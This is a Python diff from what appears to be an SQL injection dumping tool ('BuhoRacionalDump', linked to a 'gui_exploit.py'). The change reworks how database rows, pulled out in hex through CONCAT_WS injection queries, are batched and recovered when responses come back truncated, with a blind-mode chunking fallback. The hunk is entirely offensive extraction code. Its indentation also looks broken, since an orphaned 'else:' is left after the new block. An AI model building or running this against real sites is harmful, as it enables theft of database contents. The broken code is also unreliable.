@@ -369,39 +369,44 @@ class BuhoRacionalDump:
             
             val, truncated = self._make_request(batch_query)
             
-            # Lógica de Adaptación
-            is_effectively_truncated = truncated
+            # Lógica de Adaptación Mejorada
             
-            if val and not is_effectively_truncated:
-                # ÉXITO
+            # Si recibimos datos, intentamos procesarlos incluso si hubo truncamiento
+            if val:
                 if entity_type == "generic" and batch_size == 1:
-                    # En modo single generic, val es el HEX crudo de una fila
-                    # PERO: si usamos CONCAT_WS(0x7c, ...), el resultado es un string HEX único.
-                    # Debemos devolverlo tal cual, pero gui_exploit.py espera un array.
-                    # El problema es que si el HEX es muy largo, aquí no hay '|' para separar filas,
-                    # porque es 1 sola fila.
                     parts = [val]
                 else:
                     parts = val.split('<R>')
+                    
+                # Si hubo truncamiento, la última parte puede estar incompleta.
+                # En generic/batch>1, verificamos integridad si es posible (difícil sin checksum)
+                # Pero al menos, si hay truncamiento, descartamos la última parte si hay más de una.
+                if truncated and len(parts) > 1:
+                    parts = parts[:-1] # Descartar la última fila rota
+                elif truncated and len(parts) == 1:
+                    # Si solo había 1 y está rota, es un fallo total de este lote
+                    parts = []
                 
-                # Yield results immediately
-                yield parts, total_count, batch_size
-                
-                results.extend(parts)
-                offset += len(parts)
-                
-                # Optimización de subida de batch
-                if len(val) < 28 and current_batch < 15:
-                    batch_size += 1
-            else:
-                # FALLO (Truncado o Error)
-                if current_batch > 1:
-                    # Reducir batch
-                    if current_batch <= 5:
-                        batch_size = current_batch - 1
-                    else:
-                        batch_size = max(1, current_batch // 2)
-                    continue 
+                if parts:
+                    # Yield valid parts
+                    yield parts, total_count, batch_size
+                    
+                    results.extend(parts)
+                    offset += len(parts)
+                    
+                    # Si tuvimos éxito parcial (al menos 1 fila), NO reducimos el batch size drásticamente
+                    # Solo si el éxito fue muy pobre (ej. pedimos 100, llegaron 2)
+                    continue
+            
+            # Si llegamos aquí, es porque val es None (error) o val estaba vacío/roto tras limpieza
+            # FALLO (Truncado severo o Error)
+            if current_batch > 1:
+                # Reducir batch
+                if current_batch <= 5:
+                    batch_size = current_batch - 1
+                else:
+                    batch_size = max(1, current_batch // 2)
+                continue 
                 else:
                     # Lote es 1 y falló -> Dato Largo -> Chunking
                     if val is None and mode_blind:
